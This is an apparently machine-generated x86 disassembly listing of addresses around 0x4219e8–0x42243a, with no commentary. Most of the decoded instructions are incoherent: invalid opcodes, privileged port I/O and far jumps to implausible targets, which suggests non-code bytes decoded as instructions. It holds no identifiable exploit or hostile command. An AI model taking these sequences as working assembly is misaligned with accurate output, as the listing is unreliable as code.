  4219e8:	or     cl,ch
  4219ea:	push   cs
  4219eb:	cmp    al,0xb9
	...
  421a0a:	add    BYTE PTR [eax],al
  421a0c:	xor    al,cl
  421a0e:	jg     0x421a82
  421a10:	sub    DWORD PTR [ebx-0x40],ebx
  421a13:	pop    es
  421a14:	xchg   edx,eax
  421a15:	inc    edx
  421a16:	adc    cl,bh
  421a18:	sub    eax,eax
  421a1a:	or     edi,eax
  421a1c:	pop    ds
  421a1d:	sahf   
  421a1e:	enter  0x13cf,0x9d
  421a22:	gs push 0xffffffb6
  421a25:	sub    al,0x66
  421a27:	jo     0x421a6d
  421a29:	bnd call 0xd081978f
  421a2f:	cmc    
  421a30:	sbb    DWORD PTR [ebx+0x13],edx
  421a33:	(bad)  
  421a34:	pop    ds
  421a35:	sahf   
  421a36:	ror    BYTE PTR [edi-0x78d01b6d],0x81
  421a3d:	inc    edx
  421a3e:	adc    al,0x2f
  421a40:	aam    0xdc
  421a42:	or     al,BYTE PTR [eax]
  421a44:	xchg   esi,eax
  421a45:	pop    es
  421a46:	add    BYTE PTR [eax],al
  421a48:	fs xor bh,0x20
  421a4c:	arpl   WORD PTR [ebx+edi*2-0x75ffcbf5],ax
  421a53:	inc    esi
  421a54:	pop    ebx
  421a55:	and    al,0x8c
  421a57:	or     al,0x40
  421a59:	jmp    0x6626c4
  421a5e:	mov    DWORD PTR [ebx+0x64],eax
  421a61:	pop    ds
  421a62:	add    eax,0x876a0a77
  421a67:	inc    esi
  421a68:	cmp    BYTE PTR [esi+0x67],ah
  421a6b:	rcr    BYTE PTR [esi],0x66
  421a6e:	or     edi,DWORD PTR [esi+0x0]
	...
  421a8c:	add    BYTE PTR [eax],al
  421a8e:	scas   eax,DWORD PTR es:[edi]
  421a8f:	inc    ax
  421a92:	dec    edx
  421a93:	test   esp,esp
  421a95:	xor    BYTE PTR [ebp-0x17],ch
  421a98:	(bad)  
  421a99:	jmp    esp
  421a9b:	imul   eax,DWORD PTR [ebp+0x3769e846],0xe5affbc1
  421aa5:	inc    esi
  421aa6:	(bad)  
  421aa8:	(bad)  
  421aa9:	jg     0x421a3a
  421aab:	or     dh,BYTE PTR [edx+ebp*1+0x34]
  421aaf:	mov    ebp,0x7fe77409
  421ab4:	mul    DWORD PTR [eax]
  421ab6:	fnstenv [edi-0x3e]
  421ab9:	inc    esi
  421aba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421abb:	lock in al,0x2e
  421abe:	scas   eax,DWORD PTR es:[edi]
  421abf:	(bad)  
  421ac0:	(bad)  
  421ac1:	jg     0x421b02
  421ac3:	or     esi,DWORD PTR [ecx+0x9]
  421ac6:	jmp    0x724:0x3d0ffd45
  421acd:	add    BYTE PTR [edi+edi*2-0x9],dh
  421ad1:	or     ah,BYTE PTR [ebx-0x7e]
  421ad4:	adc    ecx,DWORD PTR [ebx]
  421ad6:	fs inc ebp
  421ad9:	inc    esi
  421ada:	gs sub ah,ch
  421add:	push   cs
  421ade:	or     eax,0x8d0000de
  421ae3:	out    dx,al
  421ae4:	or     eax,0x4a4f5f74
  421ae9:	adc    eax,0x1a105f29
  421aee:	xor    al,0xdd
  421af0:	or     eax,DWORD PTR [eax]
	...
  421b0e:	add    BYTE PTR [eax],al
  421b10:	or     eax,0xa0adb69
  421b15:	ins    DWORD PTR es:[edi],dx
  421b16:	aad    0x9
  421b18:	or     eax,0x17f880e9
  421b1d:	loop   0x421aa3
  421b1f:	call   0x8043043b
  421b24:	repz in eax,0x83
  421b27:	dec    ebp
  421b28:	add    eax,0x194d839a
  421b2d:	xchg   edx,eax
  421b2e:	mov    al,al
  421b30:	adc    DWORD PTR [ecx],ecx
  421b32:	and    BYTE PTR [edi+0xa],bl
  421b35:	addr16 dec eax
  421b37:	or     DWORD PTR ds:0x1a7a1ce9,ecx
  421b3d:	push   0x20
  421b3f:	or     DWORD PTR ds:0xcebe0fe9,ecx
  421b45:	stos   BYTE PTR es:[edi],al
  421b46:	inc    esi
  421b47:	push   ss
  421b48:	or     eax,0xc0146a3
  421b4d:	data16 (bad) [ebp+0x42]
  421b51:	and    DWORD PTR [eax+0x40],ebx
  421b54:	mov    ?,WORD PTR [eax]
  421b56:	inc    esp
  421b57:	je     0x421b51
  421b59:	nop
  421b5a:	push   esp
  421b5b:	sub    al,0x8e
  421b5d:	inc    eax
  421b5e:	add    al,0x74
  421b60:	in     al,dx
  421b61:	mov    al,ds:0x308e1854
  421b66:	add    eax,0xf910074
  421b6b:	sbb    DWORD PTR [esi+ebx*8],0x0
  421b6f:	add    BYTE PTR [ebx-0x5e],cl
  421b72:	test   BYTE PTR [ecx],0x0
	...
  421b91:	add    BYTE PTR [esi-0x1],ah
  421b94:	(bad)
  421b97:	icebp  
  421b98:	out    dx,eax
  421b99:	in     al,dx
  421b9a:	ret    
  421b9b:	shr    DWORD PTR [ecx+edi*8-0x364618f4],0xd0
  421ba3:	icebp  
  421ba4:	out    0xec,eax
  421ba6:	mov    ecx,0xe54af9a4
  421bac:	lods   eax,DWORD PTR ds:[esi]
  421bad:	leave  
  421bae:	enter  0xe3f1,0xec
  421bb2:	sti    
  421bb3:	shr    DWORD PTR [esi+esi*8],0x1f
  421bb7:	out    0x21,eax
  421bb9:	xor    DWORD PTR [edx],0x4a
  421bbc:	pop    ebx
  421bbd:	adc    dl,ch
  421bbf:	push   ebx
  421bc0:	add    BYTE PTR [ebp+eax*8+0x53],cl
  421bc4:	out    0x4b,al
  421bc6:	cdq    
  421bc7:	icebp  
  421bc8:	cs pop eax
  421bca:	push   ss
  421bcb:	dec    eax
  421bcc:	out    0x88,al
  421bce:	rol    BYTE PTR [esi],1
  421bd0:	out    0x3,eax
  421bd2:	rol    DWORD PTR [edx-0x3],cl
  421bd5:	push   cs
  421bd6:	in     al,0xfc
  421bd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421bd9:	inc    esi
  421bda:	add    eax,DWORD PTR [ecx]
  421bdc:	xor    dh,0xc8
  421bdf:	inc    edx
  421be0:	cmc    
  421be1:	cmc    
  421be2:	in     eax,0xf0
  421be4:	lods   al,BYTE PTR ds:[esi]
  421be5:	inc    esi
  421be6:	sti    
  421be7:	out    dx,eax
  421be8:	xchg   ecx,eax
  421be9:	or     dl,bl
  421beb:	inc    edx
  421bec:	fld    QWORD PTR [edx]
  421bee:	mov    ah,0x4
  421bf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421bf1:	inc    esi
  421bf2:	and    eax,DWORD PTR [edx]
  421bf4:	sub    eax,0x46
	...
  421c11:	add    BYTE PTR [eax],al
  421c13:	add    BYTE PTR [edx-0x59f8b011],dh
  421c19:	fst    DWORD PTR [ebp-0x78]
  421c1c:	lds    ecx,FWORD PTR [ecx]
  421c1e:	arpl   WORD PTR [ebx+0x4],di
  421c21:	add    bh,ah
  421c23:	mov    DWORD PTR [eax-0xe],eax
  421c26:	in     eax,dx
  421c27:	xchg   ebp,eax
  421c28:	retf   
  421c29:	test   edi,edi
  421c2b:	in     al,dx
  421c2c:	xchg   ebp,eax
  421c2d:	xor    ebp,eax
  421c2f:	stos   BYTE PTR es:[edi],al
  421c30:	push   cs
  421c31:	cmp    al,0xc9
  421c34:	aad    0xec
  421c36:	mov    DWORD PTR [edi+0x13b60b0f],esi
  421c3c:	mov    DWORD PTR ds:0xb5e905,edx
  421c42:	(bad)  
  421c43:	scas   eax,DWORD PTR es:[edi]
  421c44:	or     edi,ebp
  421c46:	out    0xd2,al
  421c48:	adc    DWORD PTR [eax],eax
  421c4a:	add    BYTE PTR [ebx-0x5],ah
  421c4d:	dec    BYTE PTR [edi+esi*1]
  421c50:	push   edi
  421c51:	pop    ss
  421c52:	sbb    al,0xee
  421c54:	add    eax,DWORD PTR [ebx+ebx*1-0x7ffff118]
  421c5b:	rcl    BYTE PTR ds:0x34692e4d,1
  421c61:	fidiv  DWORD PTR [ebx-0x9]
  421c64:	mov    ds,eax
  421c66:	inc    edi
  421c67:	xor    al,0x18
  421c69:	ret    0xdf45
  421c6c:	cld    
  421c6d:	loope  0x421c72
  421c6f:	call   0xa3c21c82
  421c74:	or     al,0xb
  421c76:	xor    DWORD PTR [edx+0x0],0x0
	...
  421c95:	add    BYTE PTR [eax+eax*1],dl
  421c98:	add    BYTE PTR [ecx-0x39],ch
  421c9b:	dec    eax
  421c9c:	or     eax,0x6cc64
  421ca1:	jmp    0xf1585f6e
  421ca6:	mov    ecx,0xee8ffe1
  421cab:	xor    dh,0xe3
  421cae:	push   ebp
  421caf:	xor    al,0x80
  421cb1:	arpl   WORD PTR [ecx],cx
  421cb3:	dec    ebp
  421cb4:	xor    al,0x69
  421cb6:	(bad)  
  421cb7:	dec    ebx
  421cb8:	jae    0x421c9a
  421cba:	enter  0x1642,0xe2
  421cbe:	test   eax,0xa4ffffc9
  421cc3:	cld    
  421cc4:	jg     0x421cc0
  421cc6:	jne    0x421cff
  421cc8:	sbb    eax,0x71483f80
  421ccd:	or     DWORD PTR [edx],esi
  421ccf:	inc    ebx
  421cd0:	push   ss
  421cd1:	adc    ebx,DWORD PTR ds:0x74fffc7b
  421cd7:	jl     0x421ccf
  421cd9:	add    DWORD PTR [ecx-0x66047ff6],eax
  421cdf:	aaa    
  421ce0:	add    eax,0x10d2a2c6
  421ce5:	jmp    0x4219c9
  421cea:	mov    ah,0xb6
  421cec:	dec    BYTE PTR [esi]
  421cee:	mov    cl,0x2e
  421cf0:	or     al,BYTE PTR [eax]
  421cf2:	and    al,0x7c
  421cf4:	test   DWORD PTR [ecx+0x3b],0xa6581
	...
  421d17:	add    BYTE PTR [esp+edi*8],dh
  421d1a:	lds    eax,FWORD PTR [esi+0x22]
  421d1d:	int    0xe5
  421d1f:	nop
  421d20:	and    al,0xfc
  421d22:	(bad)  
  421d23:	jg     0x421cf2
  421d25:	into   
  421d26:	jno    0x421d40
  421d28:	je     0x421ce4
  421d2a:	std    
  421d2b:	push   cs
  421d2c:	jno    0x421d40
  421d2e:	or     al,BYTE PTR [eax]
  421d30:	in     al,0x83
  421d32:	test   DWORD PTR [ebp-0x5],0xf40a457e
  421d39:	add    eax,esi
  421d3b:	inc    esi
  421d3c:	loop   0x421d43
  421d3e:	out    0x73,eax
  421d40:	fs mov edx,0x83de74fd
  421d46:	cmc    
  421d47:	add    eax,ecx
  421d49:	push   ds
  421d4a:	cmp    bl,0x16
  421d4d:	das    
  421d4e:	push   es
  421d4f:	(bad)  
  421d50:	(bad)  
  421d51:	int    0x8
  421d53:	jmp    0x421dbf
  421d55:	xor    edi,0x55
  421d58:	or     eax,0x53c602b4
  421d5d:	iret   
  421d5e:	add    al,0xe9
  421d60:	ds imul edx,edi,0xfa5c1a3e
  421d67:	or     DWORD PTR ds:0x2345c2e9,ecx
  421d6d:	mov    cl,0xe7
  421d6f:	inc    ebx
  421d70:	lea    esp,[ebx]
  421d72:	add    dh,BYTE PTR [ebx+0x2d]
  421d75:	imul   ebx,ecx,0x80e1d803
  421d7b:	clc    
	...
  421d98:	add    BYTE PTR [eax],al
  421d9a:	mov    edi,0xcbc6156b
  421d9f:	mov    dh,0xf9
  421da1:	call   0xd1b86a0
  421da6:	mov    eax,0xdef880c2
  421dab:	dec    ebx
  421dac:	es (bad) 
  421dae:	retf   
  421daf:	(bad)  
  421db0:	repz call 0x41986c0
  421db6:	adc    ah,BYTE PTR [esp+edi*1+0x7]
  421dba:	or     eax,0x1f680e9
  421dbf:	into   
  421dc0:	test   DWORD PTR [ebp+0x14],edx
  421dc3:	jmp    0xf9489dc8
  421dc8:	or     al,BYTE PTR [ebx+0xe048]
  421dce:	retf   
  421dcf:	test   BYTE PTR es:[edx],0xeb
  421dd3:	stos   BYTE PTR es:[edi],al
  421dd4:	mov    BYTE PTR [ebp+0xe],dl
  421dd7:	or     ah,0x7
  421dda:	or     eax,0x2df880e9
  421ddf:	into   
  421de0:	test   al,al
  421de2:	adc    eax,0x418100e9
  421de7:	lds    esp,FWORD PTR [eax]
  421de9:	add    BYTE PTR [eax-0x1f],al
  421dec:	xchg   DWORD PTR [ebx-0x17],eax
  421def:	push   esi
  421df1:	mov    cl,BYTE PTR [esi+0x1c]
  421df4:	pop    es
  421df5:	test   BYTE PTR [eax],ah
  421df7:	out    dx,al
  421df8:	jmp    0x421e50
  421dfa:	adc    DWORD PTR [esi+0x2a4],edi
	...
  421e1c:	clc    
  421e1d:	push   es
  421e1e:	jge    0x421e65
  421e20:	mov    cl,BYTE PTR [eax-0x323914cf]
  421e26:	xor    eax,0xe83d92dc
  421e2b:	pop    ds
  421e2c:	jb     0x421e33
  421e2e:	ins    BYTE PTR es:[edi],dx
  421e2f:	ja     0x421e43
  421e31:	add    bh,ah
  421e33:	mov    eax,ecx
  421e35:	out    dx,al
  421e36:	retf   0x68d
  421e39:	push   es
  421e3a:	add    BYTE PTR [edx+ecx*1+0x0],bl
  421e3e:	out    0x83,eax
  421e40:	inc    ebp
  421e41:	or     DWORD PTR [ebx-0x14],esi
  421e44:	ret    0xe3da
  421e47:	push   edi
  421e48:	daa    
  421e49:	jg     0x421e3c
  421e4b:	and    bh,BYTE PTR [ecx-0x55362e24]
  421e51:	(bad)  
  421e53:	dec    edi
  421e54:	std    
  421e55:	jg     0x421e28
  421e57:	or     DWORD PTR [ecx-0xd2098f6],esp
  421e5d:	dec    esp
  421e5e:	test   edx,eax
  421e60:	push   eax
  421e61:	dec    DWORD PTR [ecx]
  421e63:	out    dx,eax
  421e64:	sbb    dl,BYTE PTR [ecx]
  421e66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e67:	bound  edx,QWORD PTR [edx+0xa6dd73e]
  421e6d:	cmp    BYTE PTR [edi-0x21],ah
  421e70:	pop    ss
  421e71:	pop    esi
  421e72:	jo     0x421eb6
  421e74:	inc    DWORD PTR [esp+edi*2]
  421e77:	les    ecx,FWORD PTR [esi]
  421e79:	and    al,0x5f
  421e7b:	inc    edx
  421e7c:	ror    BYTE PTR [edx+0x201a],cl
	...
  421e9e:	in     eax,dx
  421e9f:	jp     0x421e39
  421ea1:	or     ecx,DWORD PTR [ecx+0xee10016]
  421ea7:	add    BYTE PTR [ecx-0x37d4d12],cl
  421ead:	(bad)  
  421eaf:	xchg   BYTE PTR [ebx+0x5],al
  421eb2:	cdq    
  421eb3:	sub    dl,al
  421eb5:	mov    ecx,0x36fcc38b
  421eba:	mov    WORD PTR [ebp+0x3b98f373],ss
  421ec0:	adc    eax,0x2098b05
  421ec5:	popa   
  421ec6:	iret   
  421ec7:	jmp    0x717d:0x217fa789
  421ece:	int    0x1b
  421ed0:	or     eax,0xf9068dee
  421ed5:	push   ss
  421ed6:	and    BYTE PTR ss:[ebx-0x3b],0x2e
  421edb:	add    bh,ah
  421edd:	in     al,dx
  421ede:	push   ss
  421edf:	add    BYTE PTR [eax],al
  421ee1:	imul   esp,DWORD PTR [edx-0xb],0xfc556d0c
  421ee8:	(bad)  
  421ee9:	call   0xf689f77c
  421eee:	lea    esi,[edi]
  421ef0:	or     cl,ch
  421ef2:	push   cs
  421ef3:	mov    esi,0xdcfae845
  421ef8:	jmp    0x80422de3
  421efd:	ret    0x33a
  421f00:	and    DWORD PTR [ecx+0x0],0x0
	...
  421f1f:	add    dl,bl
  421f21:	sar    esp,cl
  421f23:	scas   eax,DWORD PTR es:[edi]
  421f24:	dec    esp
  421f25:	aad    0x23
  421f27:	shl    BYTE PTR [esi-0x71170005],0xd7
  421f2e:	push   ebx
  421f2f:	out    dx,al
  421f30:	lea    edi,[edx-0x45486905]
  421f36:	inc    ebp
  421f37:	call   0x107fc68
  421f3c:	mov    ebx,0x8f800000
  421f41:	adc    BYTE PTR [ebx],cl
  421f43:	test   eax,edi
  421f45:	lods   al,BYTE PTR ds:[esi]
  421f46:	sti    
  421f47:	jmp    FWORD PTR [edx+0x3e]
  421f4a:	std    
  421f4b:	es cmp eax,0xb4000385
  421f51:	xor    bh,0x2f
  421f54:	mov    bl,0x7f
  421f56:	sahf   
  421f57:	cld    
  421f58:	inc    ebx
  421f59:	mov    edx,0x287546c2
  421f5e:	in     eax,0xa2
  421f60:	imul   eax,DWORD PTR [eax],0x0
  421f63:	lea    esp,[edi+0x530838c9]
  421f69:	adc    DWORD PTR [esi+0x62ba33fb],0x62bdc20f
  421f73:	or     DWORD PTR [ecx+esi*8],0x65
  421f77:	mov    DWORD PTR [edx+0x3546c2d0],ebp
  421f7d:	and    esp,ebp
  421f7f:	sub    BYTE PTR [ebx],0x0
  421f82:	add    BYTE PTR [eax+0x0],al
	...
  421fa0:	add    BYTE PTR [eax],al
  421fa2:	aas    
  421fa3:	daa    
  421fa4:	or     eax,DWORD PTR [ebp-0x44a6f]
  421faa:	jp     0x421fed
  421fac:	std    
  421fad:	sub    DWORD PTR ds:0x2400032b,edi
  421fb3:	jge    0x421ff4
  421fb5:	rol    BYTE PTR [eax],1
  421fb7:	or     DWORD PTR [ebx],ecx
  421fb9:	xchg   DWORD PTR [ebp+esi*4-0x5],ebx
  421fbd:	dec    DWORD PTR [edx+0x9]
  421fc0:	mov    esi,0xe47d4ac3
  421fc5:	xor    BYTE PTR [edx-0x79],cl
  421fc8:	inc    edx
  421fc9:	adc    bh,BYTE PTR [edx+0x7d2afd3e]
  421fcf:	or     al,0x3
  421fd1:	add    BYTE PTR ds:0xf880e9,cl
  421fd7:	in     al,dx
  421fd8:	or     dh,al
  421fda:	push   ebx
  421fdb:	call   0xda920704
  421fe0:	add    BYTE PTR [eax],al
  421fe2:	lea    ecx,[esi+0xe]
  421fe5:	or     eax,0xfcd4c789
  421fea:	stos   BYTE PTR es:[edi],al
  421feb:	xor    BYTE PTR [ebp-0x7],ah
  421fee:	mov    ds:0x7f88432,al
  421ff3:	fidivr DWORD PTR [ebx+edx*1-0x6f]
  421ff7:	inc    edx
  421ff8:	xlat   BYTE PTR ds:[ebx]
  421ff9:	mov    ebx,edx
  421ffb:	mov    cl,0x1c
  421ffd:	xchg   esp,eax
  421ffe:	adc    DWORD PTR [ebp-0x16faea17],ebp
  422004:	add    dh,al
	...
  422022:	add    BYTE PTR [eax],al
  422024:	retf   
  422025:	out    0xf,eax
  422027:	out    0x3,eax
  422029:	loop   0x42202b
  42202b:	add    BYTE PTR [edx],dl
  42202d:	sub    eax,ebx
  42202f:	mov    DWORD PTR [ebp+0xd406b11],ecx
  422035:	pop    ebp
  422036:	les    ecx,FWORD PTR [ecx+edx*4]
  422039:	push   0x660dffff
  42203e:	pop    eax
  42203f:	and    al,0x19
  422041:	jmp    0x75c82893
  422046:	sbb    al,0x10
  422048:	xchg   esp,eax
  422049:	or     eax,0x73121c20
  42204e:	rol    BYTE PTR [eax+0x45c24625],0xe
  422055:	jmp    0xeb4e6618
  42205a:	dec    edi
  42205b:	sub    al,0x8e
  42205d:	mov    al,0x5
  42205f:	je     0x42207c
  422061:	jmpw   0x9968
  422065:	mov    ecx,0xff900d48
  42206a:	inc    esp
  42206b:	add    ecx,DWORD PTR ds:0xf41a500
  422071:	or     BYTE PTR [eax-0x18fff739],al
  422077:	rcl    DWORD PTR [eax-0x2],0xed
  42207b:	jmp    0x39d3:0x3e6f9cd
  422082:	jmp    0xe4d7cc85
  422087:	add    eax,DWORD PTR [eax]
	...
  4220a5:	add    BYTE PTR ds:0xa205acba,cl
  4220ab:	out    0x97,eax
  4220ad:	add    DWORD PTR ds:0xcd91e600,ecx
  4220b3:	test   DWORD PTR [esi-0x45],esp
  4220b6:	cmc    
  4220b7:	aas    
  4220b8:	out    0x7f,eax
  4220ba:	ret    0x6302
  4220bd:	adc    eax,0x8e6d27a
  4220c2:	mov    ebx,0x8c4ae941
  4220c7:	fdiv   st,st(1)
  4220c9:	or     BYTE PTR [eax+0xd03e46d],cl
  4220cf:	ror    edx,cl
  4220d1:	xchg   BYTE PTR [eax],dl
  4220d3:	fwait
  4220d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220d5:	add    ecx,DWORD PTR [ebx+0x39]
  4220d8:	jmp    0x38c3:0x5402b017
  4220df:	(bad)  
  4220e0:	retf   0x2a05
  4220e3:	xor    ecx,ebp
  4220e5:	add    ecx,DWORD PTR ds:0xe1032cd2
  4220eb:	popa   
  4220ec:	out    dx,al
  4220ed:	jo     0x422149
  4220ef:	rcr    DWORD PTR [esi+0x1be90c20],1
  4220f5:	add    cl,BYTE PTR ds:0xc3ec500
  4220fb:	adc    al,0x4d
  4220fd:	push   eax
  4220fe:	or     edx,DWORD PTR [eax+eax*1]
  422101:	cmp    eax,0xafbf6d0a
  422106:	fstp   DWORD PTR ds:0x9006
	...
  422128:	add    esi,edi
  42212a:	(bad)  
  42212b:	call   0xed445cc8
  422130:	loope  0x42217a
  422132:	push   es
  422133:	jmp    0xea87f346
  422138:	xchg   esp,eax
  422139:	inc    ebx
  42213a:	add    DWORD PTR [ecx-0x28],ebp
  42213d:	pop    es
  42213e:	or     eax,0xfcd1cc6e
  422143:	jmp    0x2410ab5b
  422148:	(bad)  
  422149:	or     eax,0x30ea978
  42214e:	sbb    DWORD PTR [edi+0x69000009],0x68
  422155:	cli    
  422156:	or     al,0x6c
  422158:	sub    eax,0xb8e8fffa
  42215d:	cmp    eax,DWORD PTR [edx]
  42215f:	loopne 0x4221c2
  422161:	clc    
  422162:	add    eax,0x45d20ee9
  422167:	jmp    0x138:0x69014394
  42216e:	or     eax,0xfcd0dc6e
  422173:	jmp    0xc410ab8b
  422178:	mov    WORD PTR [ecx],ss
  42217a:	js     0x422125
  42217c:	push   cs
  42217d:	add    eax,DWORD PTR [ebx+0x96f]
  422183:	imul   ecx,DWORD PTR [eax+0x4],0x3b38b7e9
  42218a:	add    DWORD PTR [ebx+0x0],esi
	...
  4221a9:	add    al,dl
  4221ab:	(bad)  
  4221ac:	jg     0x42217e
  4221ae:	or     BYTE PTR [ebx+0x76],cl
  4221b1:	ficomp WORD PTR [eax+0x760039c1]
  4221b7:	and    DWORD PTR [eax+0x40],edi
  4221ba:	in     al,0x2f
  4221bc:	cmp    BYTE PTR [di+0xb07],0x85
  4221c2:	jge    0x4221c3
  4221c4:	(bad)  
  4221c5:	push   DWORD PTR [edx+0x7d0a0212]
  4221cb:	mov    WORD PTR [ecx],es
  4221cd:	add    ah,ah
  4221cf:	stos   BYTE PTR es:[edi],al
  4221d0:	inc    edx
  4221d1:	add    ebp,DWORD PTR [esi]
  4221d3:	cmp    edi,edi
  4221d5:	jg     0x422164
  4221d7:	retf   
  4221d8:	jae    0x422228
  4221da:	stos   DWORD PTR es:[edi],eax
  4221db:	or     ch,0x3a
  4221de:	xor    DWORD PTR es:[eax+0x40],edi
  4221e2:	mov    ah,0x2f
  4221e4:	aas    
  4221e5:	sub    BYTE PTR ds:0x75850bcd,0xff
  4221ec:	(bad)  
  4221ed:	jmp    edx
  4221ef:	adc    al,BYTE PTR [edx]
  4221f1:	or     ecx,ebp
  4221f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4221f4:	add    DWORD PTR [eax],eax
  4221f6:	je     0x4221a2
  4221f8:	inc    edx
  4221f9:	add    edi,esi
  4221fb:	cmp    bh,bh
  4221fd:	jg     0x42223c
  4221ff:	shl    BYTE PTR [ebx+0x26],cl
  422202:	dec    ebx
  422203:	or     ch,0x3a
  422206:	div    BYTE PTR [eax+edi*2]
  422209:	inc    eax
  42220a:	fs das 
  42220c:	pop    ss
  42220d:	add    BYTE PTR [eax],0x0
	...
  42222c:	std    
  42222d:	ror    BYTE PTR [ebx],cl
  42222f:	test   DWORD PTR [ebp-0xd000001],ebp
  422235:	adc    al,BYTE PTR [edx]
  422237:	or     al,0x1d
  422239:	jge    0x42223c
  42223b:	add    BYTE PTR [esp+edi*2],ah
  42223e:	mul    DWORD PTR [eax]
  422240:	dec    ebx
  422241:	push   eax
  422242:	je     0x422249
  422244:	xor    al,0xfc
  422246:	lds    eax,FWORD PTR [esi+0x26]
  422249:	cld    
  42224a:	in     al,0x6e
  42224c:	or     eax,0x8d0000e4
  422251:	mov    dl,0x19
  422253:	jae    0x4222a9
  422255:	lahf   
  422256:	cmp    eax,0x30522bff
  42225b:	and    al,0x11
  42225d:	pop    esp
  42225e:	mov    dl,0xc
  422260:	xchg   ecx,eax
  422261:	lock cld 
  422263:	jmp    edx
  422265:	push   edx
  422266:	push   ebx
  422267:	or     BYTE PTR [eax-0x79d7b092],dl
  42226d:	sbb    eax,0x9af61020
  422272:	xor    ecx,DWORD PTR [ecx-0x7d55792d]
  422278:	int    0xd5
  42227a:	push   es
  42227b:	mov    cl,BYTE PTR [ebx-0x52]
  42227e:	sbb    al,0x81
  422280:	sbb    edx,ebx
  422282:	mov    BYTE PTR [ebp-0x6],al
  422285:	push   edx
  422286:	ds adc eax,0x4388adf1
  42228c:	jmp    0xc52676
	...
  4222ad:	add    BYTE PTR [ecx],bh
  4222af:	xor    ebx,edx
  4222b1:	cld    
  4222b2:	mov    ?,WORD PTR [ebp+0x300d1c1c]
  4222b8:	and    al,0x3
  4222ba:	or     eax,0x18f880d9
  4222bf:	xchg   esp,eax
  4222c0:	cli    
  4222c1:	(bad)
  4222c4:	push   cs
  4222c5:	jmp    0xa197c67
  4222ca:	add    bl,BYTE PTR [esp+ecx*4+0x2]
  4222ce:	or     eax,0xc45bad9
  4222d3:	mov    ah,0xe7
  4222d5:	sahf   
  4222d6:	lea    eax,[edx]
  4222d8:	and    al,0xd
  4222da:	mov    esp,edx
  4222dc:	cld    
  4222dd:	jmp    FWORD PTR [edx]
  4222df:	pop    ecx
  4222e0:	xlat   BYTE PTR ds:[ebx]
  4222e1:	push   es
  4222e2:	adc    al,BYTE PTR [eax]
  4222e4:	imul   ecx,edi,0xe
  4222e7:	add    bh,ah
  4222e9:	adc    BYTE PTR [ebp+0x9],cl
  4222ec:	sub    esp,DWORD PTR [eax]
  4222ee:	and    DWORD PTR [ebp-0x21],edx
  4222f1:	mov    BYTE PTR [esi+0x24],dl
  4222f4:	xlat   BYTE PTR ds:[ebx]
  4222f5:	mov    al,BYTE PTR [esi+0x24]
  4222f8:	sar    DWORD PTR [ebp-0x7408feb8],cl
  4222fe:	push   eax
  4222ff:	add    esp,DWORD PTR [edi-0x28]
  422302:	pop    ss
  422303:	push   ebp
  422304:	xor    al,0x5e
  422306:	rol    BYTE PTR [ebp-0x18],1
  422309:	adc    DWORD PTR ds:0x21202b09,ecx
  42230f:	jmp    DWORD PTR [edx-0x35]
	...
  42232e:	add    BYTE PTR [eax],al
  422330:	push   cs
  422331:	add    bh,ah
  422333:	mov    BYTE PTR [ecx],bh
  422335:	cld    
  422336:	rcr    ebx,0x3e
  422339:	sbb    al,0x62
  42233b:	das    
  42233c:	icebp  
  42233d:	repz popa 
  42233f:	aas    
  422340:	jmp    0x4b043534
  422345:	jnp    0x422373
  422347:	aam    0xb9
  422349:	test   BYTE PTR [esi],ah
  42234b:	dec    edi
  42234c:	pop    ss
  42234d:	jp     0x4222f3
  42234f:	in     al,dx
  422350:	cs test dl,dh
  422353:	call   DWORD PTR [edx-0x377629bb]
  422359:	test   BYTE PTR [edx],0x55
  42235c:	xchg   ebp,eax
  42235d:	inc    ebx
  42235e:	add    eax,DWORD PTR ds:0xcc7d8510
  422364:	pop    ecx
  422365:	into   
  422366:	imul   ebx,DWORD PTR [edi+0x29],0x95eae6f4
  42236d:	add    esp,edi
  42236f:	add    ecx,DWORD PTR [ebp+0x134ef0ca]
  422375:	(bad)  
  422376:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422377:	add    ah,dh
  422379:	(bad)  
  42237b:	inc    esi
  42237c:	adc    DWORD PTR [esi-0x406b14b3],edx
  422382:	or     ecx,DWORD PTR [ecx]
  422384:	xchg   edx,eax
  422385:	in     eax,0x6
  422387:	push   ebp
  422388:	enter  0x7446,0x8
  42238c:	dec    eax
  42238d:	push   esp
  42238e:	adc    DWORD PTR [eax],esp
  422390:	xlat   BYTE PTR ds:[ebx]
  422391:	inc    ebx
  422392:	add    ch,cl
	...
  4223b0:	add    BYTE PTR [eax],al
  4223b2:	jno    0x510919
  4223b8:	and    bh,0x4e
  4223bb:	in     eax,0x59
  4223bd:	in     eax,0xe
  4223bf:	add    BYTE PTR [edx+ecx*1],bh
  4223c2:	push   cs
  4223c3:	jno    0x422384
  4223c5:	lahf   
  4223c6:	xchg   ecx,eax
  4223c7:	and    DWORD PTR [ebx],ecx
  4223c9:	and    BYTE PTR [edx],0x79
  4223cc:	inc    eax
  4223cd:	mov    ecx,0x6e0d051d
  4223d2:	js     0x4223d5
  4223d4:	add    cl,ch
  4223d6:	jle    0x1e0b8e9c
  4223dc:	xchg   edi,eax
  4223dd:	pusha  
  4223de:	push   edi
  4223df:	clc    
  4223e0:	xchg   BYTE PTR [edi-0x1ace1966],bh
  4223e6:	push   cs
  4223e7:	add    BYTE PTR [edx+eax*8],bh
  4223ea:	in     eax,0x4
  4223ec:	(bad)  
  4223ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4223ee:	or     dh,bh
  4223f0:	out    0xc,al
  4223f2:	add    eax,0xebfd0000
  4223f7:	cli    
  4223f8:	xchg   edx,eax
  4223f9:	sub    DWORD PTR [edi],edi
  4223fb:	lds    esp,FWORD PTR [ebx]
  4223fd:	fsubrp st(6),st
  4223ff:	inc    edx
  422400:	add    dl,BYTE PTR [eax]
  422402:	push   ebp
  422403:	add    DWORD PTR [eax],eax
  422405:	jmp    0xfd666d95
  42240a:	push   cs
  42240b:	mov    BYTE PTR [ebp-0x18],0x18
  42240f:	sti    
  422410:	add    DWORD PTR [eax],0x29
  422413:	add    eax,0x0
	...
  422434:	mov    edi,0x23850c30
  422439:	lods   al,BYTE PTR ds:[esi]
  42243a:	xor    al,0xff
